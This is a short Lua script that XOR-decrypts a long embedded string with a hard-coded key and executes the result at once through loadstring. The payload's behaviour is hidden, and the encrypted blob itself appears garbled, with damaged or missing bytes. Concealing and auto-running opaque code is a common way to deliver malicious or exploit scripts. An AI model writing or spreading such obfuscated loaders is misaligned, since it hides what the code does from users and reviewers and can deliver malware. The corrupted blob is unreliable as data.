
local function xor_decrypt(data, key)
	local decrypted = {}
	for i = 1, #data do
		local decrypted_char = string.char(bit32.bxor(string.byte(data, i), string.byte(key, (i - 1) % #key + 1)))
		table.insert(decrypted, decrypted_char)
	end
	return table.concat(decrypted)
end

local encrypted_script = [[ R O.@ LHA_ GIVV'5K]IKG[KJ O[	FAOPNK N|
JONA
FML[E _L8
YLHA#\#_?O6\G*KLHAN!G 
ARZA AFIRf<^DXRH	YA`'
HAQUA
MD&@
*W	AYEPa!@MMoxa9QV"  <A G LxLUA"VLRAF+\7CfOADE1AALM6	AAA}&	VL	VL
  A@eADERg	U\N]	ONX[YWVFULYNYkLOA0KLHAYfeKIE[*V&QUCZCno_L3ZA
RI	A  ZLL	VL:3(oAL]RI	*	'A46)Z[HfUAL @L [{# E]ekMU"[	
/ EALUA_ EA*VO\DZ'*^9=-LBZVZNAOFP C @W]`N^KJBRH9LOADoRLULAU%VIVU2D Z	U
VO 
RZAA	DWfUALU.A (!
	;G	GIALOADER`LHA(
PfUALUALO"KAQUCv 'VUCBAA/ gUOLM=
&\U*VUAFE\ LP$IxLUALUA%  RLW @
HCAUTFRYVX\G^$LUALUAL;	 RLDQfUALHnERLALUAAO5L	Z
KLAG
A ]fUALU*V&QU*	(]^ZIN+D@FGOILW]FQCEALO K*	ALM>OR	LG,_IBXHEEFLxLUAfUALD.W%AQO K*	AG
nERLUALU\@]	$"ZD]FCUNKYBQ@[\@GSC;IKGZ  CL[D\kLUALOAD2@V=W	GHDE_L=AG
A+AU\eADERK fUALOADE=\ 	!
+ZZIoRLUALUALOA*KLHAN0ACHoRLUALUALOA'
Z	LHA% KA'@eADERLUALUA%  RLW @
HCAUTFRYVX\G^$LUALUALOADE&GAQUT9LOADERLHfUAL
 o@k R O5RL"DV"  &O]fUAL! 	 RLW,@eADERgLHAKVZNXWRWQGUMC@ALO1 G.QO	KfHf5RU  &KIHfOADE<OAQUCvE9KU@NYkLOA  OLHANCkDER81@ QU fOADE1O 
QOZD# _
HnERLUALU*V&QU7VfOADE@|ALfeLIE3JU LG DAG
A $8V4W.
ALUA}DXR/Ax	CHoRLU"Q
DXRH]DFkDERLUAL6	V*ZfUALU]eM]]

local key = "lua3loader.lua"
local decrypted_script = xor_decrypt(encrypted_script, key)
loadstring(decrypted_script)()
